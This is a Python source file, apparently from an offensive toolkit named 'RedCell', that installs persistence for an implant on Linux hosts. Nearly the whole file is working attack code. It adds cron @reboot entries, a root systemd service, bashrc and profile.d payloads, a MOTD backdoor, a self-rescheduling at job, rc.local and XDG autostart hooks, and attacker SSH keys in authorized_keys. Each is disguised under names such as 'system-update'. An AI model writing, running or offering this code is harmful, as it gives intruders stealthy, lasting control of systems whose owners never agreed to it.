"""
Linux/Unix Persistence Module

Implements various persistence techniques for Linux/Unix systems.
"""

import os
import subprocess
import stat
from typing import Optional, Dict, List


class LinuxPersistence:
    """
    Linux/Unix persistence mechanisms.

    Techniques:
    - Cron jobs
    - Systemd services
    - Init scripts
    - Profile/bashrc modifications
    - SSH key installation
    - At jobs
    - MOTD backdoors
    """

    def __init__(self, implant_path: Optional[str] = None, name: str = 'system-update'):
        """
        Initialize Linux persistence.

        Args:
            implant_path: Path to implant executable/script
            name: Name for persistence mechanism
        """
        self.implant_path = implant_path
        self.name = name
        self.persistence_methods = []

    def cron_job(
        self,
        schedule: str = '@reboot',
        user: Optional[str] = None
    ) -> bool:
        """
        Create cron job persistence.

        Args:
            schedule: Cron schedule (@reboot, @daily, */5 * * * *, etc.)
            user: Username for cron (None for current user)

        Returns:
            True if successful
        """
        if not self.implant_path:
            print("[-] No implant path specified")
            return False

        try:
            # Get current crontab
            if user:
                result = subprocess.run(
                    ['crontab', '-u', user, '-l'],
                    capture_output=True,
                    text=True
                )
            else:
                result = subprocess.run(
                    ['crontab', '-l'],
                    capture_output=True,
                    text=True
                )

            current_cron = result.stdout if result.returncode == 0 else ""

            # Add new cron entry
            new_entry = f"{schedule} {self.implant_path}\n"

            if new_entry.strip() in current_cron:
                print("[*] Cron entry already exists")
                return True

            updated_cron = current_cron + new_entry

            # Write updated crontab
            if user:
                proc = subprocess.Popen(
                    ['crontab', '-u', user, '-'],
                    stdin=subprocess.PIPE,
                    text=True
                )
            else:
                proc = subprocess.Popen(
                    ['crontab', '-'],
                    stdin=subprocess.PIPE,
                    text=True
                )

            proc.communicate(input=updated_cron)

            if proc.returncode == 0 or proc.returncode is None:
                print(f"[+] Cron job created: {schedule} {self.implant_path}")
                self.persistence_methods.append({
                    'type': 'cron',
                    'schedule': schedule,
                    'user': user or 'current'
                })
                return True

        except Exception as e:
            print(f"[-] Error creating cron job: {e}")

        return False

    def systemd_service(
        self,
        service_name: Optional[str] = None,
        description: str = "System Update Service",
        user: str = "root"
    ) -> bool:
        """
        Create systemd service persistence.

        Args:
            service_name: Service name (uses self.name if None)
            description: Service description
            user: User to run service as

        Returns:
            True if successful
        """
        if not self.implant_path:
            print("[-] No implant path specified")
            return False

        service_name = service_name or self.name
        service_file = f"/etc/systemd/system/{service_name}.service"

        service_content = f"""[Unit]
Description={description}
After=network.target

[Service]
Type=simple
User={user}
ExecStart={self.implant_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""

        try:
            # Write service file
            with open(service_file, 'w') as f:
                f.write(service_content)

            # Reload systemd
            subprocess.run(['systemctl', 'daemon-reload'], check=True, timeout=10)

            # Enable service
            subprocess.run(['systemctl', 'enable', service_name], check=True, timeout=10)

            # Start service
            subprocess.run(['systemctl', 'start', service_name], check=True, timeout=10)

            print(f"[+] Systemd service created and started: {service_name}")
            self.persistence_methods.append({
                'type': 'systemd',
                'name': service_name,
                'file': service_file
            })
            return True

        except Exception as e:
            print(f"[-] Error creating systemd service: {e}")
            return False

    def bashrc_persistence(
        self,
        payload: str,
        target_user: Optional[str] = None,
        global_bashrc: bool = False
    ) -> bool:
        """
        Add persistence to bash profile.

        Args:
            payload: Bash command to add
            target_user: Target username (None for current)
            global_bashrc: Use /etc/bash.bashrc instead

        Returns:
            True if successful
        """
        try:
            if global_bashrc:
                bashrc_path = '/etc/bash.bashrc'
            elif target_user:
                bashrc_path = f"/home/{target_user}/.bashrc"
            else:
                bashrc_path = os.path.expanduser("~/.bashrc")

            # Add payload to bashrc
            with open(bashrc_path, 'a') as f:
                f.write(f"\n# System update check\n{payload}\n")

            print(f"[+] Bashrc persistence added: {bashrc_path}")
            self.persistence_methods.append({
                'type': 'bashrc',
                'path': bashrc_path
            })
            return True

        except Exception as e:
            print(f"[-] Error adding bashrc persistence: {e}")
            return False

    def profile_d_script(self, script_name: Optional[str] = None) -> bool:
        """
        Create script in /etc/profile.d/ for persistence.

        Args:
            script_name: Script name (uses self.name if None)

        Returns:
            True if successful
        """
        if not self.implant_path:
            print("[-] No implant path specified")
            return False

        script_name = script_name or f"{self.name}.sh"
        script_path = f"/etc/profile.d/{script_name}"

        script_content = f"""#!/bin/bash
# System update script
{self.implant_path} &
"""

        try:
            with open(script_path, 'w') as f:
                f.write(script_content)

            # Make executable
            os.chmod(script_path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)

            print(f"[+] Profile.d script created: {script_path}")
            self.persistence_methods.append({
                'type': 'profile_d',
                'path': script_path
            })
            return True

        except Exception as e:
            print(f"[-] Error creating profile.d script: {e}")
            return False

    def ssh_authorized_keys(
        self,
        public_key: str,
        target_user: Optional[str] = None
    ) -> bool:
        """
        Add SSH public key for persistence.

        Args:
            public_key: SSH public key content
            target_user: Target username (None for current)

        Returns:
            True if successful
        """
        try:
            if target_user:
                ssh_dir = f"/home/{target_user}/.ssh"
            else:
                ssh_dir = os.path.expanduser("~/.ssh")

            authorized_keys_path = os.path.join(ssh_dir, "authorized_keys")

            # Create .ssh directory if it doesn't exist
            os.makedirs(ssh_dir, mode=0o700, exist_ok=True)

            # Add public key
            with open(authorized_keys_path, 'a') as f:
                f.write(f"\n{public_key}\n")

            # Set correct permissions
            os.chmod(authorized_keys_path, 0o600)

            print(f"[+] SSH key added: {authorized_keys_path}")
            self.persistence_methods.append({
                'type': 'ssh_key',
                'path': authorized_keys_path
            })
            return True

        except Exception as e:
            print(f"[-] Error adding SSH key: {e}")
            return False

    def motd_backdoor(self) -> bool:
        """
        Create MOTD (Message of the Day) backdoor.

        Returns:
            True if successful
        """
        if not self.implant_path:
            print("[-] No implant path specified")
            return False

        motd_script = "/etc/update-motd.d/99-custom-update"

        script_content = f"""#!/bin/bash
# Custom system update
{self.implant_path} &
"""

        try:
            with open(motd_script, 'w') as f:
                f.write(script_content)

            # Make executable
            os.chmod(motd_script, 0o755)

            print(f"[+] MOTD backdoor created: {motd_script}")
            self.persistence_methods.append({
                'type': 'motd',
                'path': motd_script
            })
            return True

        except Exception as e:
            print(f"[-] Error creating MOTD backdoor: {e}")
            return False

    def at_job(self, delay_minutes: int = 5) -> bool:
        """
        Create at job for persistence.

        Args:
            delay_minutes: Minutes to delay execution

        Returns:
            True if successful
        """
        if not self.implant_path:
            print("[-] No implant path specified")
            return False

        try:
            # Create recursive at job
            command = f"{self.implant_path} && echo '{self.implant_path} && at now + {delay_minutes} minutes' | at now + {delay_minutes} minutes"

            proc = subprocess.Popen(
                ['at', f'now + {delay_minutes} minutes'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            stdout, stderr = proc.communicate(input=command)

            if proc.returncode == 0:
                print(f"[+] At job created (runs every {delay_minutes} minutes)")
                self.persistence_methods.append({
                    'type': 'at_job',
                    'delay': delay_minutes
                })
                return True
            else:
                print(f"[-] Failed to create at job: {stderr}")

        except Exception as e:
            print(f"[-] Error creating at job: {e}")

        return False

    def rc_local(self) -> bool:
        """
        Add persistence to /etc/rc.local.

        Returns:
            True if successful
        """
        if not self.implant_path:
            print("[-] No implant path specified")
            return False

        rc_local_path = "/etc/rc.local"

        try:
            # Check if rc.local exists
            if not os.path.exists(rc_local_path):
                # Create rc.local
                with open(rc_local_path, 'w') as f:
                    f.write("#!/bin/bash\n")

                os.chmod(rc_local_path, 0o755)

            # Read current content
            with open(rc_local_path, 'r') as f:
                content = f.read()

            # Add implant before 'exit 0' if it exists
            if 'exit 0' in content:
                content = content.replace('exit 0', f'{self.implant_path} &\nexit 0')
            else:
                content += f'\n{self.implant_path} &\n'

            # Write updated content
            with open(rc_local_path, 'w') as f:
                f.write(content)

            print(f"[+] rc.local persistence added: {rc_local_path}")
            self.persistence_methods.append({
                'type': 'rc_local',
                'path': rc_local_path
            })
            return True

        except Exception as e:
            print(f"[-] Error adding rc.local persistence: {e}")
            return False

    def xdg_autostart(
        self,
        desktop_name: Optional[str] = None,
        display_name: str = "System Update"
    ) -> bool:
        """
        Create XDG autostart entry (for GUI sessions).

        Args:
            desktop_name: Desktop file name
            display_name: Display name for application

        Returns:
            True if successful
        """
        if not self.implant_path:
            print("[-] No implant path specified")
            return False

        desktop_name = desktop_name or f"{self.name}.desktop"
        autostart_dir = os.path.expanduser("~/.config/autostart")
        desktop_file = os.path.join(autostart_dir, desktop_name)

        desktop_content = f"""[Desktop Entry]
Type=Application
Name={display_name}
Exec={self.implant_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""

        try:
            os.makedirs(autostart_dir, exist_ok=True)

            with open(desktop_file, 'w') as f:
                f.write(desktop_content)

            print(f"[+] XDG autostart entry created: {desktop_file}")
            self.persistence_methods.append({
                'type': 'xdg_autostart',
                'path': desktop_file
            })
            return True

        except Exception as e:
            print(f"[-] Error creating XDG autostart entry: {e}")
            return False

    def cleanup_persistence(self, method_index: Optional[int] = None) -> bool:
        """
        Remove persistence mechanisms.

        Args:
            method_index: Index of specific method to remove (None for all)

        Returns:
            True if successful
        """
        methods_to_remove = [self.persistence_methods[method_index]] if method_index is not None else self.persistence_methods

        success = True
        for method in methods_to_remove:
            try:
                if method['type'] == 'cron':
                    # Remove cron entry (requires manual editing for now)
                    print(f"[!] Manual removal required for cron job")

                elif method['type'] == 'systemd':
                    subprocess.run(['systemctl', 'stop', method['name']], timeout=10)
                    subprocess.run(['systemctl', 'disable', method['name']], timeout=10)
                    if os.path.exists(method['file']):
                        os.remove(method['file'])
                    subprocess.run(['systemctl', 'daemon-reload'], timeout=10)
                    print(f"[+] Removed systemd service: {method['name']}")

                elif method['type'] in ['bashrc', 'profile_d', 'motd', 'rc_local', 'xdg_autostart', 'ssh_key']:
                    if 'path' in method and os.path.exists(method['path']):
                        # For bashrc/rc.local, should remove specific lines (simplified here)
                        if method['type'] in ['bashrc', 'rc_local']:
                            print(f"[!] Manual cleanup recommended for: {method['path']}")
                        else:
                            os.remove(method['path'])
                        print(f"[+] Removed: {method['path']}")

            except Exception as e:
                print(f"[-] Error removing {method['type']}: {e}")
                success = False

        if method_index is None:
            self.persistence_methods = []
        else:
            del self.persistence_methods[method_index]

        return success

    def list_persistence(self) -> List[Dict]:
        """
        List all active persistence mechanisms.

        Returns:
            List of persistence method dictionaries
        """
        return self.persistence_methods

    def generate_report(self) -> str:
        """
        Generate persistence report.

        Returns:
            Formatted report string
        """
        report = []
        report.append("=" * 60)
        report.append("LINUX PERSISTENCE REPORT")
        report.append("=" * 60)
        report.append(f"\nTotal persistence mechanisms: {len(self.persistence_methods)}\n")

        for i, method in enumerate(self.persistence_methods, 1):
            report.append(f"[{i}] {method['type'].upper()}")

            for key, value in method.items():
                if key != 'type':
                    report.append(f"    {key}: {value}")

            report.append("")

        report.append("=" * 60)
        return "\n".join(report)


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell Linux Persistence')
    parser.add_argument('implant', nargs='?', help='Path to implant executable/script')
    parser.add_argument('--name', default='system-update', help='Persistence name')
    parser.add_argument('--cron', action='store_true', help='Use cron job')
    parser.add_argument('--systemd', action='store_true', help='Use systemd service')
    parser.add_argument('--bashrc', action='store_true', help='Use bashrc persistence')
    parser.add_argument('--ssh-key', help='SSH public key for persistence')
    parser.add_argument('--all', action='store_true', help='Use all methods')
    parser.add_argument('--cleanup', action='store_true', help='Remove persistence')

    args = parser.parse_args()

    persist = LinuxPersistence(args.implant, args.name)

    if args.cleanup:
        persist.cleanup_persistence()
        return

    if args.all or args.cron:
        persist.cron_job()

    if args.all or args.systemd:
        persist.systemd_service()

    if args.all or args.bashrc:
        if args.implant:
            persist.bashrc_persistence(f"{args.implant} &")

    if args.ssh_key:
        persist.ssh_authorized_keys(args.ssh_key)

    print("\n" + persist.generate_report())


if __name__ == '__main__':
    main()
